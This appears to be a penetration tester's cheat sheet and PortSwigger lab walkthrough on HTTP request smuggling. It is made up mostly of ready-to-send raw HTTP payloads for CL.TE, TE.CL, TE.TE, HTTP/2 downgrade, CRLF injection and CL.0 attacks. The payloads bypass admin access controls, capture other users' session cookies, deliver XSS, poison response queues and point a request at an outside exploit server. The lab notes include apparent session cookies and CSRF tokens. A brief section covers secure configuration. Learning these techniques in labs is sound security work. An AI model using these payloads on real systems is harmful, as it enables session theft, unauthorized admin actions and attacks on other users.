tactic: Multiple

**HTTP Request Smuggling** exploits disagreements between how a front-end and back-end server determine where one HTTP request ends and the next begins. The attacker smuggles a hidden prefix into the back-end's buffer that gets prepended to the next legitimate user's request — causing the back-end to process a malformed, attacker-controlled request on behalf of another user.

```
Normal flow:
Client → Front-end → Back-end
[Request 1][Request 2][Request 3]   ← clean boundaries

Smuggled flow:
Client → Front-end → Back-end
[Request 1 + prefix][Request 2]
Back-end sees: [Request 1][prefix + Request 2]  ← poisoned
```

HTTP/1.1 allows two ways to specify request length — the conflict between them is the vulnerability:

```
Content-Length (CL)       → explicit byte count
Transfer-Encoding (TE)    → chunked, terminated with size 0 chunk
```

When front-end and back-end disagree on which to trust, the attacker controls where requests are split.

---

## Vulnerability Types

|Type|Front-end uses|Back-end uses|
|---|---|---|
|CL.TE|Content-Length|Transfer-Encoding|
|TE.CL|Transfer-Encoding|Content-Length|
|TE.TE|Transfer-Encoding|Transfer-Encoding (obfuscated)|
|H2.CL|HTTP/2|HTTP/1 Content-Length|
|H2.TE|HTTP/2|HTTP/1 Transfer-Encoding|
|CL.0|Content-Length|Ignores body (treats as 0)|

---

## Chunked Encoding Reference

```http
Transfer-Encoding: chunked

5\r\n          ← chunk size in hex
HELLO\r\n      ← chunk data
0\r\n          ← terminating chunk (size 0)
\r\n           ← end of chunked body
```

**Important: always include `\r\n\r\n` after the final `0` in TE.CL payloads.**

---

## TE Header Obfuscation (TE.TE Bypass)

One server processes TE, the other ignores it due to malformed syntax:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding : chunked
```

---

## Checklist

### Detection — Time Delay

**CL.TE detection** — short CL, front-end forwards only the CL bytes, back-end waits for next chunk indefinitely:

```http
POST /about HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

If response takes ~10 seconds → CL.TE confirmed

**TE.CL detection** — front-end sends `0` chunk, back-end waits for remaining CL bytes:

```http
POST /about HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If response times out → TE.CL confirmed

### Detection — Differential Response (Confirmation)

**CL.TE confirm** — smuggle a prefix that causes 404 on the next request:
```http
POST / HTTP/1.1
Content-Length: 38
Transfer-Encoding: chunked

3
x=y
0

GET /404 HTTP/1.1
Foo: x
```

Follow immediately with a normal `GET /` — if you get a 404 → confirmed.

**TE.CL confirm:**

```http
POST / HTTP/1.1
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Send a normal follow-up — 404 response confirms TE.CL.

### Important Notes

- Send attack and normal requests over **different** network connections
- Use the **same URL and parameters** so both hit the same back-end server
- In load-balanced environments, if attack and normal go to different servers the attack fails
- Target endpoints that accept POST to avoid connection resets from errors

---

## Classic Attacks

### CL.TE — Basic

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Next user's request gets `G` prepended → `GPOST / HTTP/1.1` → 405 error confirms smuggling.

### TE.CL — Basic
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0
```

### TE.TE — Obfuscated
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

97
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=1
0
```

---

## Exploitation

### Bypass Front-End Access Controls (CL.TE)

```http
POST / HTTP/1.1
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Bypass Front-End Access Controls (TE.CL)

```http
POST / HTTP/1.1
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=1
0
```

**Hex size rule for TE.CL:** count bytes from after the size line to before the terminator `0`.

### Reveal Front-End Request Rewriting

The front-end adds headers (IP, TLS info, custom auth headers) that aren't visible. To discover them:

1. Find a POST endpoint that reflects a parameter in the response
2. Smuggle a request that reflects the next user's request into a comment/search field
3. Set the `Content-Length` large enough to capture the appended headers

```http
POST / HTTP/1.1
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR_SESSION
Content-Length: 600

csrf=TOKEN&postId=9&name=a&email=a@a.com&website=http://a.com&comment=
```

The next request's headers get appended to `comment=` and stored — revealing the custom front-end headers like `X-Custom-IP: 127.0.0.1`.

### Bypass Client Authentication via TLS Header Injection

```http
POST / HTTP/1.1
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Content-Length: 10

x=
```

The front-end strips these headers from normal requests but not from smuggled ones since they bypass the front-end entirely.

### Capture Other Users' Requests (Cookie Theft)

Smuggle a prefix that captures the next victim's full request into your comment:

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 268

0

POST /post/comment HTTP/1.1
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=TOKEN&postId=4&name=a&email=a@a.com&website=https://a.com&comment=test
```

Increase `Content-Length` to capture more of the victim's request. Check the comment — it will contain their full request headers including cookies.

### XSS via Request Smuggling

If the app reflects a header value without sanitization (e.g. User-Agent):

```http
POST / HTTP/1.1
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=3 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

The next user to visit `/post?postId=3` gets the XSS fired — no interaction needed from the attacker.

## HTTP/2 Smuggling

HTTP/2 uses binary frames with explicit lengths — no CL/TE ambiguity natively. But **downgrading** to HTTP/1 re-introduces the vulnerability.

### H2.CL — Content-Length 0 Smuggling

```http
POST / HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

### H2.TE — Transfer-Encoding in HTTP/2

```http
POST / HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### CRLF Injection in HTTP/2 Headers

In HTTP/2, `\r\n` inside a header value is not a delimiter — it gets passed through and interpreted as a header separator by HTTP/1 back-end during downgrading:

```
FOO: bar\r\n
Transfer-Encoding: chunked
```

In Burp's inspector, add the header value with a literal CRLF:

```
Name: FOO
Value: 1\r\nTransfer-Encoding: chunked
```

```http
POST / HTTP/2
FOO: 1\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

search=prefix
```

### HTTP/2 Request Splitting via CRLF

Inject a complete second request into a header value — more versatile than body-based smuggling:

```
Name: foo
Value: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

### Response Queue Poisoning (H2.TE)

Sends a complete smuggled request that poisons the response queue — subsequent users receive each other's responses:

```http
POST /anything HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION
```

---

## CL.0 Smuggling (Browser-Powered)

The back-end ignores the `Content-Length` header for certain endpoints — effectively treating CL as 0. No chunked encoding or HTTP/2 needed.

**Setup:**

1. Create two tabs in a Burp Repeater group
2. Tab 1: attack request (keep-alive)
3. Tab 2: normal follow-up request
4. Send group in sequence (single connection)
5. Change `Connection: keep-alive`

http

```http
POST /resources/images/blog.svg HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

**Detection:** if the follow-up request returns 404 (from the smuggled `GET /hopefully404`) → CL.0 confirmed.

---

## White Box Testing

**Vulnerable, front-end trusts CL, back-end trusts TE — classic CL.TE:**

```java
// Nginx (front-end) — configured to use Content-Length for routing
// Tomcat (back-end) — processes Transfer-Encoding: chunked
// This mismatch is a configuration issue, not a single code fix
// Most common in reverse proxy setups without explicit header normalization

// Nginx config — missing header normalization
// proxy_pass http://backend;
// (no proxy_set_header to strip/normalize conflicting length headers)
```

**Vulnerable, HTTP/2 downgrading without stripping injected headers:**

```java
// Back-end receives downgraded HTTP/1 request with attacker-injected TE header
// Front-end should strip Transfer-Encoding and Content-Length from HTTP/2 requests
// before forwarding — many do not

// HAProxy config — missing header sanitization during downgrade
// No h2-to-h1 header stripping configured
```

**Secure configuration principles:**

```
1. Use HTTP/2 end-to-end where possible — eliminates CL/TE ambiguity
2. Normalize ambiguous requests at the front-end:
   - Reject requests with both CL and TE headers
   - Strip TE headers before forwarding if not needed by back-end
3. Configure the back-end to reject ambiguous requests rather than guess
4. Use consistent server software on front-end and back-end — reduces parsing differences
5. Enable Burp Scanner's HTTP smuggling detection in CI/CD pipelines

# Nginx — reject ambiguous requests
# merge_slashes off;
# Add to server block:
# if ($http_transfer_encoding ~* "chunked") {
#     return 400;  # reject chunked on endpoints that don't need it
# }

# Apache — normalize CL/TE conflicts
# Require consistent header handling via mod_security rules
```

---

# LABS


### HTTP request smuggling, basic CL.TE vulnerability

```HTTP
POST / HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded 
Content-Length: 6 Transfer-Encoding: chunked 
0


G

```


### HTTP request smuggling, basic TE.CL vulnerability

```http
POST / HTTP/1.1
Host: 0a9300cb04d114d8810848e000ce00d2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0	

```

TE front end and CL back-end

front-end TE checks 56 till 0 
back-end takes the 4 byte  56  and the rest is smug

in the second request 

```http
POST / HTTP/1.1
Host: 0a9300cb04d114d8810848e000ce00d2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

### TE.TE behavior: obfuscating the TE header


```http
POST / HTTP/1.1
Host: 0a28006404874f0a896ad875003d0020.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

97
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=1
0
```

2nd request

```http
POST / HTTP/1.1
Host: 0a28006404874f0a896ad875003d0020.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=a

```

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses


`POST / HTTP/1.1`
```HTTP

Content-Length: 38
tRANSFER-ENCODING: chunked

3
x=y
0

GET /404 HTTP/1.1
Foo: x
```


`GET / HTTP 1.1`
`HTTP/1.1 404 Not Found` 


since the ` GET /404` was attached to the next `GET / `request 


### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

when inserting the content length just select from after the last header till the hex size TE 

when inserting the hex size TE count from after the size till before the space of the terminator

You need to include the trailing sequence `\r\n\r\n` following the final `0`.


```HTTP
Content-length: 4
Transfer-Encoding: chunked
\r\n
5e\r\n
POST /404 HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n

```


### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```HTTP
Content-Length: 139
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
Host: localhost\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 10\r\n
\r\n
x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability


the size of hex `TE`  is from after size till before terminator `0`
uncheck the TE update 
remember to add \r\n\r\n after 0

content-type
content-length
body 
try , POST , GET 

```HTTP

Content-length: 4
Transfer-Encoding: chunked

87
GET admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-length: 100
Content-Type: application/x-www-form-urlencoded

x=1
0


```


### Exploiting HTTP request smuggling to reveal front-end request rewriting


from the POST comment we can leave the comment free for a smuggle for then next request to be attached and there we will see the  custom header 
```HTTP
Transfer-Encoding: chunked
Priority: u=0, i

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=Pr6Aw7JkfgzU3VyfpqUPDlno4fVmc6gh
Content-Length: 600

csrf=d4GpBKkWtHGBdJ4CrEI8OO5vu3VYv7xI&postId=9&name=aaa&email=a%40aa.com&website=http%3A%2F%2Fa.com&comment=
```


```HTTP

0

POST /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-ZDZARC-Ip: 127.0.0.1
Content-Length: 5

x=1
```


### Exploiting HTTP request smuggling to capture other users' requests

now the purpose is to place this prefix all above the victims request hence the lab says that the fron-end doesn't support chunked we insert a valid CL but TE is 0 to inject all of it above the next request 

for some reason we need to place a Content-type in the prefix and the request 

```HTTP
POST / HTTP/1.1
Host: 0a3d005103311177803a9e8b00af003d.web-security-academy.net
Cookie: session=smjOaQ1eTRWwNsBBkQZywiUdm5JjxcpC
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 268

0

POST /post/comment HTTP/1.1
Cookie: session=smjOaQ1eTRWwNsBBkQZywiUdm5JjxcpC
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=ogmcOer9dPhu40HFGeJs0QzjfvNUlX1x&postId=4&name=a&email=a%40a.com&website=https%3A%2F%2Fa.com&comment=test



```

play around with the  CL 
### Exploiting HTTP request smuggling to deliver reflected XSS

in the request of the `GET /post ` we notice that there is an 
`<input user-agent` unprotected value we can escape it with `">` remember for XSS use `GET`

``` HTTP
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=3 HTTP/1.1
User-Agent: aaa"><script>alert();</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```




### H2.CL request smuggling

use /resource/js since another file name will result as not found  so this file `/resource/js` already exist in the system 

```HTTP
POST / HTTP/2
Host: 0a9800c004b6d4f2d9a61bd0003400af.web-security-academy.net
Cookie: session=lKGu2SV3616Zj6fh4AQm0l4VQJOAIpI6
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-0a8e00bb0484d4ffd9521afb0162007f.exploit-server.net/
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```


### HTTP/2 request smuggling via CRLF injection


the idea is that http2 doesnt support transfer encoding chunked hence we take advantage of the CRLF which basiaclly mean `/r/n` is not interpreted as space new line in http2 but in http1 it is 


```HTTP
POST / HTTP/2
Host: 0a3900de0410a6eec950655b004b0084.web-security-academy.net
Cookie: session=ctxmuRc1rllOp8nN0XQic3Vk4rRMMa4j; _lab_analytics=90NKobxDYzS4ATrgz2G2Hq3n7PbAfPqvfHnkYWd8bJhJBYudm3N2BxD8bWJiZehPwvOUHqy5fRBPL9iudmXNK0lC7VqUoxpuDIwU2WiozpaiEBlzVAdza8RLt4TrNNovnT9LY3eSliDXCtkXBGDCfLBk1TBJR2Dpews7vSCuh3Pb2zuPEBJym2rJZsYmeEtbNC0CntTdXk8nNQpP1HG1wvaVrM2J6jF3Q6CIHphwmEf0ypGNRv5wohsEnzzDhazk
FOO: 1/r/n Transfer-Encoding: chunked
Content-Length: 218

0

POST / HTTP/1.1
Host: 0a3900de0410a6eec950655b004b0084.web-security-academy.net
Cookie: session=ctxmuRc1rllOp8nN0XQic3Vk4rRMMa4j
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

search=h
```


 **HTTP/2 request splitting via CRLF injection**

place the path to something unknown so when we have a different response we know the attack is successful 

```HTTP
Foo: a\r\n
\r\n
GET /admin HTTP/1.1
Host: 0a6a006704dc93fa816e757e00920095.web-security-academy.net
```

**Response queue poisoning via H2.TE request smuggling**


```HTTP
POST /sdasdasd HTTP/2
Host: 0adf002f033104cd809a30e3000a009f.web-security-academy.net
Cookie: session=tvQFY2hJkbULetxemWCgK0lNqKDbKDsQ
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 0

0

GET /admin/delete?username=carlos HTTP/1.1
Host: 0adf002f033104cd809a30e3000a009f.web-security-academy.net
Cookie: session=DYxY8jvCkquDbEGqhJXbJWQUTihBrVqd


```


 **CL.0 request smuggling**

add 2 requests in the  one which is normal request and the second which contain the smuggled  send them over the same connection and keep the smuggled request  as keep-alive 

1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
    
2. Add the two tabs to a group in the correct order.
    
3. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
    
4. Change the `Connection` header to `keep-alive`.
    
5. Send the sequence and check the responses.


```HTTP
POST /resources/images/blog.svg HTTP/1.1
Host: 0ad400fd04cd3dd181b6a9f20062007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```


## Resources

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger HTTP/2 Smuggling](https://portswigger.net/web-security/request-smuggling/advanced)
- [James Kettle HTTP/2 Research](https://portswigger.net/research/http2)
- [HackTricks Request Smuggling](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling)
